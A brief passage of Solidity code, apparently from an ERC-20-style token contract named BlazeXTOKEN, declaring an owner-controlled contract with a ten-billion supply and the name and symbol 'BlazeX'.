...
contract BlazeXTOKEN is Ownable {
    address public tffvd56;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "BlazeX";
    string private _cctokensymbol = "BlazeX";
